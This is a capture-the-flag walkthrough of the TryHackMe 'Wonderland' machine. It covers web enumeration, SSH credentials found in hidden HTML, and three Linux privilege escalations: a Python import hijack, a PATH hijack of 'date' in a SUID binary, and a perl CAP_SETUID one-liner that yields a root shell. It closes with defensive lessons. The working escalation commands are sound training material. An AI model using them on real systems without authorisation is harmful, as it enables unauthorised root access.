# Try Hack Me - Wonderland

**Categories:** ctf, alice in wonderland, privesc, linux  
**Difficulty:** Medium  

Commands used in this guide use the exported variable `$IP` (`export IP=10.10.222.86`) in place of the target machine's IP address.

## 1: Enumeration - nmap, gobuster

Having launched the machine, we perform a basic TCP port scan with nmap (`sudo nmap $IP`) followed by a version enumeration scan on the 2 discovered ports (22 and 80) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/wonderland]
└─$ sudo nmap -sV $IP -p22,80 -Pn -oN nmap.out
...snip...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

With searchsploit and google showing no relevant vulnerabilities for the discovered versions, we start a gobuster scan on 80 using dirbuster's `common.txt` wordlist :

```console
┌──(kali㉿kali)-[~/Documents/tthm/wonderland]
└─$ gobuster dir -u $IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.common.out
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
...snip...
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]  
/r                    (Status: 301) [Size: 0] [--> r/] 
```

Curling the `/index.html` route doesn't give us much to go on :

```console
┌──(kali㉿kali)-[~/Documents/tthm/wonderland]
└─$ curl $IP
<!DOCTYPE html>
<head>
    <title>Follow the white rabbit.</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <h1>Follow the White Rabbit.</h1>
    <p>"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)</p>
    <img src="/img/white_rabbit_1.jpg" style="height: 50rem;">
</body> 
```

but having found the `/r/` route, we can repeat the gobuster scan to find the `/r/a/` route, and so on until we work out what is going on or until gobuster discovers the entire `/r/a/b/b/i/t/` route. This route contains a credential pair in a hidden `<p>` tag : 

```http
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:PASSWORD</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
```

Use this credential pair to connect with SSH. For an additional clue that can be used to discover the `/r/a/b/b/i/t/` route, try steghide with the `white_rabbit_1.jpg` found at `/index.html`. 

## 2. Privesc alice -> rabbit, python module import hijack 

Running `sudo -l` shows that alice can run the `walrus_and_the_carpenter.py` script found in `/home/alice` as the rabbit user :

```console
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
The full paths declared in the allowed command prevent any kind of path manipulation and the script is not writeable by alice - if there are vulnerabilities associated with this command, they are likely a feature of the script itself. The script is very simple, declaring a multi-line string `poem` and using the `random` module to print 10 random lines :

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
...snip...
"""
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

As alice does not have write permissions on the script, the only way to pass commands into the script is through the `import random` line. The obvious way to do this would be to modify the module itself, but unsurprisingly alice does not have write access to the file : 

```console
alice@wonderland:~$ locate random.py
/usr/lib/python3/dist-packages/cloudinit/config/cc_seed_random.py
/usr/lib/python3.6/random.py
alice@wonderland:~$ ls -l /usr/lib/python3.6/random.py
-rw-r--r-- 1 root root 27442 Apr 18  2020 /usr/lib/python3.6/random.py
```

So how does python manage these imports? [The docs have the following to say about module imports](https://docs.python.org/3/tutorial/modules.html#the-module-search-path) : 

```
6.1.2. The Module Search Path

When a module named spam is imported, the interpreter first searches for a built-in module with that name. If not found, it then searches for a file named spam.py in a list of directories given by the variable sys.path.
```

This seems to say that the interpreter checks the built-in modules first, and then defaults to `sys.path` if the required module is not found. [But if we check the docs for sys.path](https://docs.python.org/3/library/sys.html#sys.path), it seems that the pwd is always the first location checked for module imports : 

```
 sys.path

    A list of strings that specifies the search path for modules. Initialized from the environment variable PYTHONPATH, plus an installation-dependent default.

    As initialized upon program startup, the first item of this list, path[0], is the directory containing the script that was used to invoke the Python interpreter. 
```

So presumably we could create a file `random.py` in the same directory as the `walrus_and_the_carpenter.py` script, and this file will be discovered and imported by the interpreter as it attempts to resolve `import random` through `sys.path`. The final piece of the puzzle is knowing that python automatically executes files that are imported as modules - this means we can just dump our code into the local version of `random.py`, and we don't need to try to emulate the original structure of the real random module to avoid runtime errors. 

We prepare the exploit by adding a call to bash to a local version of random.py (we're still at `/home/alice` here) :

```console
alice@wonderland:~$ echo "import os; os.system('bash')" > random.py
```

and we execute the allowed command as the rabbit user :

```console
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

## 3. Privesc rabbit -> hatter, relative path hijack

Navigating to `/home/rabbit` we find a SUID binary `teaParty` : 

```console
rabbit@wonderland:/home/rabbit$ ls -la
total 40
...snip...
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```

Executing it, we see that it wants us to wait an hour for the arrival of the hatter :

```console
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 22 Sep 2021 02:31:48 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

Does that date output look familiar? Compare it to the output of the date binary : 

```console
rabbit@wonderland:/home/rabbit$ date
Wed Sep 22 01:32:40 UTC 2021
```

There are a number of ways to confirm whether the binary is using date (strings works, cating the binary works, strace, IDA if you're feeling up to it, etc.)- here, we'll use ltrace with the `-s` flag to stop it truncating the output :

```console
rabbit@wonderland:/home/rabbit$ ltrace -s 100 ./teaParty
setuid(1003)
setgid(1003)
...snip...
system("/bin/echo -n 'Probably by ' && date --date='next hour' -R"Probably by Wed, 22 Sep 2021 02:41:30 +0000
...snip..
```

The first two lines sets the UID and GID to the hatter user (you can double check this against the entries in `/etc/passwd`), and the following lines confirm that the teaParty binary is using date. More importantly, we see that the binary that it does not provide a full path to date. In these cases, the system relies on the PATH variable to resolve the location of the named binary (sounding familiar?). To exploit this reliance on the PATH variable, we first create a bash shell script named `date` in rabbit's home directory :

```console
rabbit@wonderland:/home/rabbit$ cat date
#!/bin/bash

bash
```

We then update the PATH variable to include the location of the pwd at the start : 

```console
rabbit@wonderland:/home/rabbit$ export PATH=./:$PATH
```

and execute teaParty : 

```console
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

The system reaches the relative path to date in the binary, dutifully checks the PATH variable for possible locations of date, checks the pwd, finds our malicious version of date and executes it, resulting in a shell as hatter.

## 4. Privesc hatter -> root, capabilities

This time no obvious options for privesc are found at `/home/hatter` (the `password.txt` file is hatter's own SHH password, and `sudo -l` shows that hatter has no sudo permissions on the box). We resort then to more traditional privesc enumeration. On my original completion of this box I used linpeas to find possible privesc vulnerabilities, but here we will stick to manual enumeration methods. We would normally try some combination of the following : 

* Find SID and GID binaries (`find / -perm /4000 2>/dev/null`)
* List running processes (`ps -aux`)
* List listening TCP ports (`ss -tlp`)
* List cronjobs (`ls /etc/cron*`)

In this case, these methods don't . Another useful manual tool is [getcap](https://man7.org/linux/man-pages/man8/getcap.8.html), which allows for a recursive search of files with capabilities. Here, we run it from `/` with the `-r` flag to recursively check all files on the system, redirecting error messages to `/dev/null` : 

```console
hatter@wonderland:/home/hatter$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
hatter@wonderland:/home/hatter$ ls -l /usr/bin/perl
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
```

This is bad. Capabilities are intended to provide a more granular approach to permissions in UNIX environments, allowing admins to assign elevated actions to files, binaries or processes without granting them full privileges associated with a group or user. For example, a file with the capability CAP_CHOWN can effectively run chown on any other file on the system, but has no other superuser / root level privileges. The CAP_SETUID granted to the perl binary found with getcap allows process started by that binary to make arbitrary changes to process UIDs - including it's own. This smells like a vulnerability.

To prepare the exploit, we need a perl script that changes the UID of it's process to O (the UID of root) and opens a bash shell - [luckily GTFObins has us covered](https://gtfobins.github.io/gtfobins/perl/#capabilities). We then execute this script with the `/usr/bin/perl` binary :

```console
hatter@wonderland:/home/hatter$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
bash: /usr/bin/perl: Permission denied
```

Right. So what's going wrong here? I'll admit that I got stuck on this for a moment, but we've already seen all the info we need to diagnose the problem. Look again at the permissions on the `/usr/bin/perl` binary and the id of our current user : 

```console
hatter@wonderland:/home/hatter$ ls -l /usr/bin/perl
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
hatter@wonderland:/home/hatter$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

While our UID is set to hatter, our GID is still set to rabbit (remember that our current session is in the bash script launched by teaParty from a bash script launched by alice's python script...) - but we need the hatter GID to execute `/usr/bin/perl` This is why we were given Hatter's password - su to hatter and try the exploit again : 

```console
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

The root flag is at `/home/alice/root.txt` and the user flag is at `/root/user.txt` (yes, everything is upside down - curiouser and curiouser...) 

## 5. Summary and recommendations

Ignoring the CTFy stuff (steghidden clues, clear text passwords in the web app,  exploitable binaries in user's home directories, etc.), the box has two main lessons for the defensive side of things :

* **Context of privileged actions** : The alice -> rabbit privesc relies the `walrus_and_the_carpenter.py` script being hosted in a writeable directory. The use of absolute path's in the sudoers entry is a good attempt to avoid PATH hijacking and python's use of sys.path to resolve imports in the cwd is not realistically avoidable. The problem here is that a privileged action is performed in a non-privileged context (`/home/alice` is writeable by alice) - hosting the script in a privileged, non-writeable context would have avoided any possibility of injection, import hijacking, etc.

* **Defensive/Secure programming** : The rabbit -> hatter privesc relies on the relative path to the date binary - this could have been avoided completely by specifying the absolute path to /bin/date 

* **Principle of least privilege** : The hatter -> root privesc relies on an interpreter with CAP_SETUID being executable by members of the hatter group. It is trivial to leverage CAP_SETUID capabilities on an interpreter to a root shell - this is probably not what was intended when scoping hatter's privileges for `/usr/bin/perl`. This is likely a case of misunderstanding what binaries are capable of with elevated privileges : when scoping privileges on system binaries, [gtobins](https://gtfobins.github.io/) is a great place to start.